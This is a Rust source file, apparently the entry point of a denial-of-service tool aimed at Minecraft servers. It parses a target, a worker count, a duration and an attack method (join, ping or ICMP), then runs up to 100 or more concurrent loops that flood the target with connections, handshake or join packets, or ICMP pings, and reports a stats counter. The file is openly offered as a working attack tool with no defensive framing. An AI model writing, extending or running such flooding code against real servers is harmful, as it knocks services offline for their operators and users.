use std::net::SocketAddrV4;
use std::process::exit;
use std::{sync::Arc, sync::atomic::Ordering};
use std::{sync::atomic::AtomicU64, time::Duration};

use clap::Parser;
use ez_colorize::ColorizeDisplay;
use rust_mc_proto_tokio::MCConnTcp;
use tokio::time::sleep;

use crate::counter::write_stats;
use crate::duration::parse_duration;
use crate::methods::icmp::send_icmp_ping;
use crate::methods::join::send_join;
use crate::methods::methods::{AttackMethod, method_to_string, parse_method};
use crate::methods::ping::send_ping;
use crate::resolver::{parse_hostname, parse_target};

mod counter;
mod duration;
mod mc_packet_utils;
mod methods;
mod resolver;

#[derive(Debug, Parser)]
struct Flags {
    ///IP or Domain of the target server. You can also use port here with ":"
    target: String,
    /// Number of workers.
    #[arg(short, long, default_value_t = 100)]
    workers: u32,
    /// Attack duration. Available formats: seconds, minutes, hours.
    #[arg(short, long, default_value_t = String::from("1m"))]
    duration: String,
    /// Attack method. Available methods: join, ping and icmp.
    #[arg(short, long, default_value_t = String::from("ping"))]
    method: String,
}

#[tokio::main]
async fn main() {
    let args = Flags::parse();
    let (duration_secs, parsed_duration) = parse_duration(&args.duration).unwrap();
    let method = Arc::new(parse_method(args.method.as_str()));
    let target = parse_target(args.target.as_str(), *method).await.unwrap();
    let hostname = Arc::new(parse_hostname(args.target.as_str()));

    println!(
        "Target: {} {} {}",
        args.target.green(),
        String::from("=").yellow(),
        target.cyan(),
    );

    println!("Method: {}", method_to_string(*method).yellow());
    println!("Duration: {}", parsed_duration.red());

    print!("\n\n\n\n\n");

    let cps = Arc::new(AtomicU64::new(0));
    let failures = Arc::new(AtomicU64::new(0));
    tokio::spawn(write_stats(cps.clone(), failures.clone()));

    for _ in 0..args.workers {
        let hostname = hostname.clone();
        let connections = cps.clone();
        let failures = failures.clone();
        let method = method.clone();

        tokio::spawn(async move {
            worker_loop(connections, failures, &target, hostname.as_str(), *method).await;
        });
    }

    tokio::spawn(async move {
        sleep(Duration::from_secs(duration_secs)).await;
        exit(0);
    });

    tokio::signal::ctrl_c().await.expect("Failed to wait for ctrl c");
}

async fn worker_loop(
    cps: Arc<AtomicU64>,
    failures: Arc<AtomicU64>,
    target: &SocketAddrV4,
    hostname: &str,
    method: AttackMethod,
) {
    loop {
        match method {
            AttackMethod::Icmp => {
                send_icmp_ping(target.ip(), cps.clone(), failures.clone()).await;
            }

            AttackMethod::Join | AttackMethod::Ping => {
                if let Ok(stream) = tokio::net::TcpStream::connect(target).await {
                    let mut conn = MCConnTcp::new(stream);
                    match method {
                        AttackMethod::Join => send_join(&mut conn, &target.port(), hostname).await,
                        AttackMethod::Ping => send_ping(&mut conn, &target.port(), hostname).await,
                        _ => { /*impossible code logic*/ }
                    };
                    cps.fetch_add(1, Ordering::Relaxed);
                } else {
                    failures.fetch_add(1, Ordering::Relaxed);
                }
            }
        }
    }
}
